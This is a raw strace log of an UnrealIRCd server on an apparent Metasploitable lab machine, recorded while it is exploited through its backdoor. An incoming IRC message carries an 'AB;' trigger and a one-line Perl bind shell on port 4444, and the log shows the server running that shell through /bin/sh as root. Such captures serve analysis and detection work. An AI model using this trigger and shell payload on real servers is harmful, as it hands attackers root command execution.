4519  07:37:14.312781 select(1024, [2 3 4 7 9], [], NULL, {0, 450000}) = 1 (in [2], left {0, 250000})
4519  07:37:14.509664 clock_gettime(CLOCK_MONOTONIC, {2644, 326675929}) = 0
4519  07:37:14.509677 accept(2, 0, NULL) = 5
4519  07:37:14.509697 getpeername(5, {sa_family=AF_INET, sin_port=htons(46565), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:37:14.509729 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:37:14.509742 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:37:14.509755 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:37:14.509767 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:37:14.509779 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:37:14.509790 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:37:14.509804 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:37:14.509821 clock_gettime(CLOCK_MONOTONIC, {2644, 326834256}) = 0
4519  07:37:14.509832 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:37:14.509845 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:37:14.509854 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:37:14.509863 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:37:14.509873 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:37:14.509889 send(6, "\251o\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:37:14.509946 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:37:14.509990 gettimeofday({1495625834, 509995}, NULL) = 0
4519  07:37:14.510045 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {1, 0})
4519  07:37:14.514373 clock_gettime(CLOCK_MONOTONIC, {2644, 331409560}) = 0
4519  07:37:14.514409 recvfrom(6, "\251o\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0$\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:37:14.514464 close(6)          = 0
4519  07:37:14.514479 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:37:14.514493 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:37:14.514572 time(NULL)        = 1495625834
4519  07:37:14.514598 time(NULL)        = 1495625834
4519  07:37:14.514613 gettimeofday({1495625834, 514617}, NULL) = 0
4519  07:37:14.514625 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:37:14.514694 clock_gettime(CLOCK_MONOTONIC, {2644, 331708287}) = 0
4519  07:37:14.514706 gettimeofday({1495625834, 514710}, NULL) = 0
4519  07:37:14.514717 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:37:14.515992 clock_gettime(CLOCK_MONOTONIC, {2644, 333010024}) = 0
4519  07:37:14.516011 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:37:14.516058 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:37:14.516096 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:37:14.516109 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:37:14.516125 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 11345
11345 07:37:14.516358 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
11345 07:37:14.516376 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
11345 07:37:14.516386 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11345 07:37:14.516400 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
11345 07:37:14.516521 brk(0)            = 0x80f9000
11345 07:37:14.516543 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11345 07:37:14.516560 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd1000
11345 07:37:14.516576 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
11345 07:37:14.516593 open("/etc/ld.so.cache", O_RDONLY) = 1
11345 07:37:14.516606 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11345 07:37:14.516625 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fc9000
11345 07:37:14.516635 close(1)          = 0
11345 07:37:14.516646 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11345 07:37:14.516661 open("/lib/libncurses.so.5", O_RDONLY) = 1
11345 07:37:14.516674 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
11345 07:37:14.516800 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
11345 07:37:14.516835 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f99000
11345 07:37:14.516848 mmap2(0xb7fc6000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7fc6000
11345 07:37:14.516865 close(1)          = 0
11345 07:37:14.516877 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11345 07:37:14.516891 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
11345 07:37:14.516906 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
11345 07:37:14.516996 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
11345 07:37:14.517013 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f95000
11345 07:37:14.517024 mmap2(0xb7f97000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f97000
11345 07:37:14.517040 close(1)          = 0
11345 07:37:14.517051 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11345 07:37:14.517069 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
11345 07:37:14.517083 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
11345 07:37:14.517172 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
11345 07:37:14.517188 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f94000
11345 07:37:14.517203 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e45000
11345 07:37:14.517214 mmap2(0xb7f8e000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f8e000
11345 07:37:14.517229 mmap2(0xb7f91000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f91000
11345 07:37:14.517270 close(1)          = 0
11345 07:37:14.517293 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e44000
11345 07:37:14.517320 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e446b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
11345 07:37:14.517376 mprotect(0xb7f8e000, 4096, PROT_READ) = 0
11345 07:37:14.517413 munmap(0xb7fc9000, 29913) = 0
11345 07:37:14.517439 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11345 07:37:14.517453 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
11345 07:37:14.517472 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9f5bb0) = -1 ENOTTY (Inappropriate ioctl for device)
11345 07:37:14.517503 brk(0)            = 0x80f9000
11345 07:37:14.517513 brk(0x80fa000)    = 0x80fa000
11345 07:37:14.517525 brk(0x80fb000)    = 0x80fb000
11345 07:37:14.517541 getuid32()        = 0
11345 07:37:14.517550 getgid32()        = 0
11345 07:37:14.517559 geteuid32()       = 0
11345 07:37:14.517568 getegid32()       = 0
11345 07:37:14.517582 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11345 07:37:14.517595 time(NULL)        = 1495625834
11345 07:37:14.517608 brk(0x80fc000)    = 0x80fc000
11345 07:37:14.517622 brk(0x80fd000)    = 0x80fd000
11345 07:37:14.517642 open("/proc/meminfo", O_RDONLY) = 1
11345 07:37:14.517664 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
11345 07:37:14.517681 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd0000
11345 07:37:14.517693 read(1, "MemTotal:      1035240 kB\nMemFree:        370612 kB\nBuffers:         82420 kB\nCached:         421984 kB\nSwapCached:          0 kB\nActive:         257088 kB\nInactive:       376248 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        370372 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            4856 kB\nWriteback:           0 kB\nAnonPages:      128984 kB\nMapped:          52008 kB\nSlab:            20052 kB\nSReclaimable:    11352 kB\nSUnreclaim:       8700 kB\nPageTables:       1972 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
11345 07:37:14.517824 close(1)          = 0
11345 07:37:14.517836 munmap(0xb7fd0000, 4096) = 0
11345 07:37:14.517848 brk(0x80fe000)    = 0x80fe000
11345 07:37:14.517874 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
11345 07:37:14.517887 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
11345 07:37:14.517899 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
11345 07:37:14.517911 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
11345 07:37:14.517923 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
11345 07:37:14.517935 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
11345 07:37:14.517948 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11345 07:37:14.517960 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
11345 07:37:14.517973 uname({sys="Linux", node="metasploitable", ...}) = 0
11345 07:37:14.518021 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11345 07:37:14.518039 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
11345 07:37:14.518058 brk(0x8100000)    = 0x8100000
11345 07:37:14.518069 getcwd("/etc/unreal", 4096) = 12
11345 07:37:14.518083 getpid()          = 11345
11345 07:37:14.518101 getppid()         = 4519
11345 07:37:14.518116 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
11345 07:37:14.518136 stat64("/sbin/sh", 0xbf9f5b88) = -1 ENOENT (No such file or directory)
11345 07:37:14.518149 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
11345 07:37:14.518166 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
11345 07:37:14.518190 socket(PF_FILE, SOCK_STREAM, 0) = 1
11345 07:37:14.518203 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
11345 07:37:14.518215 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
11345 07:37:14.518323 close(1)          = 0
11345 07:37:14.518338 socket(PF_FILE, SOCK_STREAM, 0) = 1
11345 07:37:14.518371 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
11345 07:37:14.518381 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
11345 07:37:14.518416 close(1)          = 0
11345 07:37:14.518430 open("/etc/nsswitch.conf", O_RDONLY) = 1
11345 07:37:14.518444 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
11345 07:37:14.518460 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd0000
11345 07:37:14.518471 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
11345 07:37:14.518521 read(1, "", 4096) = 0
11345 07:37:14.518530 close(1)          = 0
11345 07:37:14.518540 munmap(0xb7fd0000, 4096) = 0
11345 07:37:14.518556 open("/etc/ld.so.cache", O_RDONLY) = 1
11345 07:37:14.518568 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11345 07:37:14.518584 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fc9000
11345 07:37:14.518594 close(1)          = 0
11345 07:37:14.518605 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11345 07:37:14.518619 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
11345 07:37:14.518634 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
11345 07:37:14.518727 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
11345 07:37:14.518744 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e3b000
11345 07:37:14.518756 mmap2(0xb7e42000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7e42000
11345 07:37:14.518773 close(1)          = 0
11345 07:37:14.518784 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11345 07:37:14.518798 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
11345 07:37:14.518837 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
11345 07:37:14.518942 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
11345 07:37:14.518960 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e23000
11345 07:37:14.518971 mmap2(0xb7e37000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7e37000
11345 07:37:14.518987 mmap2(0xb7e39000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e39000
11345 07:37:14.519001 close(1)          = 0
11345 07:37:14.519027 munmap(0xb7fc9000, 29913) = 0
11345 07:37:14.519044 open("/etc/ld.so.cache", O_RDONLY) = 1
11345 07:37:14.519057 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11345 07:37:14.519073 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fc9000
11345 07:37:14.519083 close(1)          = 0
11345 07:37:14.519093 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11345 07:37:14.519108 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
11345 07:37:14.519122 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
11345 07:37:14.519215 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
11345 07:37:14.519233 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e19000
11345 07:37:14.519244 mmap2(0xb7e21000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7e21000
11345 07:37:14.519260 close(1)          = 0
11345 07:37:14.519272 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11345 07:37:14.519285 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
